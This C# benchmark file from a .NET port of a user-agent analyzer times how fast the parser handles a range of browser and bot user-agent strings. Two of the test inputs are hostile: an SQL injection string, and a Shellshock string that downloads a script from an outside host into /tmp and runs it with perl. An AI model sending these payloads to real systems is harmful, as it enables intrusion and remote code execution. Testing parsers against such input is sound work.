//<copyright file="AnalyzerBenchmarks.cs" company="OrbintSoft">
//	Yet Another UserAgent Analyzer.NET Standard
//	Porting realized by Stefano Balzarotti, Copyright (C) OrbintSoft
//
//	Original Author and License:
//
//	Yet Another UserAgent Analyzer
//	Copyright(C) 2013-2018 Niels Basjes
//
//	Licensed under the Apache License, Version 2.0 (the "License");
//	you may not use this file except in compliance with the License.
//	You may obtain a copy of the License at
//
//	https://www.apache.org/licenses/LICENSE-2.0
//
//	Unless required by applicable law or agreed to in writing, software
//	distributed under the License is distributed on an "AS IS" BASIS,
//	WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//	See the License for the specific language governing permissions and
//	limitations under the License.
//
//</copyright>
//<author>Stefano Balzarotti, Niels Basjes</author>
//<date>2018, 11, 17, 18:29</date>
//<summary></summary>

namespace OrbintSoft.Yauaa.Benchmarks
{
    using BenchmarkDotNet.Attributes;
    using OrbintSoft.Yauaa.Analyzer.Parse.UserAgentNS;

    /// <summary>
    /// Defines the <see cref="AnalyzerBenchmarks" />
    /// </summary>
    public class AnalyzerBenchmarks
    {
        /// <summary>
        /// Defines the uaa
        /// </summary>
        private UserAgentAnalyzer uaa;

        /// <summary>
        /// The GlobalSetup
        /// </summary>
        [GlobalSetup]
        public void GlobalSetup()
        {
            uaa = UserAgentAnalyzer.NewBuilder()
                .WithoutCache()
                .HideMatcherLoadStats()
                .Build();
            uaa.Parse((string)null);
        }

        /// <summary>
        /// The Android6Chrome46
        /// </summary>
        /// <returns>The <see cref="UserAgent"/></returns>
        [Benchmark]
        public UserAgent Android6Chrome46()
        {
            return uaa.Parse("Mozilla/5.0 (Linux; Android 6.0; Nexus 6 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) " +
                "Chrome/46.0.2490.76 Mobile Safari/537.36");
        }

        /// <summary>
        /// The AndroidPhone
        /// </summary>
        /// <returns>The <see cref="UserAgent"/></returns>
        [Benchmark]
        public UserAgent AndroidPhone()
        {
            return uaa.Parse("Mozilla/5.0 (Linux; Android 5.0.1; ALE-L21 Build/HuaweiALE-L21) AppleWebKit/537.36 (KHTML, like Gecko) " +
                "Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36");
        }

        /// <summary>
        /// The Googlebot
        /// </summary>
        /// <returns>The <see cref="UserAgent"/></returns>
        [Benchmark]
        public UserAgent Googlebot()
        {
            return uaa.Parse("Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)");
        }

        /// <summary>
        /// The GoogleBotMobileAndroid
        /// </summary>
        /// <returns>The <see cref="UserAgent"/></returns>
        [Benchmark]
        public UserAgent GoogleBotMobileAndroid()
        {
            return uaa.Parse("Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) " +
                "Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)");
        }

        /// <summary>
        /// The GoogleAdsBot
        /// </summary>
        /// <returns>The <see cref="UserAgent"/></returns>
        [Benchmark]
        public UserAgent GoogleAdsBot()
        {
            return uaa.Parse("AdsBot-Google (+http://www.google.com/adsbot.html)");
        }

        /// <summary>
        /// The GoogleAdsBotMobile
        /// </summary>
        /// <returns>The <see cref="UserAgent"/></returns>
        [Benchmark]
        public UserAgent GoogleAdsBotMobile()
        {
            return uaa.Parse("Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) " +
                "Version/9.0 Mobile/13B143 Safari/601.1 (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html)");
        }

        /// <summary>
        /// The IPhone
        /// </summary>
        /// <returns>The <see cref="UserAgent"/></returns>
        [Benchmark]
        public UserAgent IPhone()
        {
            return uaa.Parse("Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) " +
                "Version/9.0 Mobile/13F69 Safari/601.1");
        }

        /// <summary>
        /// The IPhoneFacebookApp
        /// </summary>
        /// <returns>The <see cref="UserAgent"/></returns>
        [Benchmark]
        public UserAgent IPhoneFacebookApp()
        {
            return uaa.Parse("Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_3 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) " +
                "Mobile/13G34 [FBAN/FBIOS;FBAV/61.0.0.53.158;FBBV/35251526;FBRV/0;FBDV/iPhone7,2;FBMD/iPhone;FBSN/iPhone OS;" +
                "FBSV/9.3.3;FBSS/2;FBCR/vfnl;FBID/phone;FBLC/nl_NL;FBOP/5]");
        }

        /// <summary>
        /// The IPad
        /// </summary>
        /// <returns>The <see cref="UserAgent"/></returns>
        [Benchmark]
        public UserAgent IPad()
        {
            return uaa.Parse("Mozilla/5.0 (iPad; CPU OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) " +
                "Version/9.0 Mobile/13F69 Safari/601.1");
        }

        /// <summary>
        /// The Win7ie11
        /// </summary>
        /// <returns>The <see cref="UserAgent"/></returns>
        [Benchmark]
        public UserAgent Win7ie11()
        {
            return uaa.Parse("Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko");
        }

        /// <summary>
        /// The Win10Edge13
        /// </summary>
        /// <returns>The <see cref="UserAgent"/></returns>
        [Benchmark]
        public UserAgent Win10Edge13()
        {
            return uaa.Parse("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) " +
                "Chrome/46.0.2486.0 Safari/537.36 Edge/13.10586");
        }

        /// <summary>
        /// The Win10Chrome51
        /// </summary>
        /// <returns>The <see cref="UserAgent"/></returns>
        [Benchmark]
        public UserAgent Win10Chrome51()
        {
            return uaa.Parse("Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) " +
                "Chrome/51.0.2704.103 Safari/537.36");
        }

        /// <summary>
        /// The Win10IE11
        /// </summary>
        /// <returns>The <see cref="UserAgent"/></returns>
        [Benchmark]
        public UserAgent Win10IE11()
        {
            return uaa.Parse("Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko");
        }

        /// <summary>
        /// The HackerSQL
        /// </summary>
        /// <returns>The <see cref="UserAgent"/></returns>
        [Benchmark]
        public UserAgent HackerSQL()
        {
            return uaa.Parse("-8434))) OR 9695 IN ((CHAR(113)+CHAR(107)+CHAR(106)+CHAR(118)+CHAR(113)+(SELECT " +
                "(CASE WHEN (9695=9695) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(122)+CHAR(118)+CHAR(118)+CHAR(113))) AND (((4283=4283");
        }

        /// <summary>
        /// The HackerShellShock
        /// </summary>
        /// <returns>The <see cref="UserAgent"/></returns>
        [Benchmark]
        public UserAgent HackerShellShock()
        {
            return uaa.Parse("() { :;}; /bin/bash -c \\\"\"wget -O /tmp/bbb ons.myftp.org/bot.txt; perl /tmp/bbb\\\"\"");
        }
    }
}
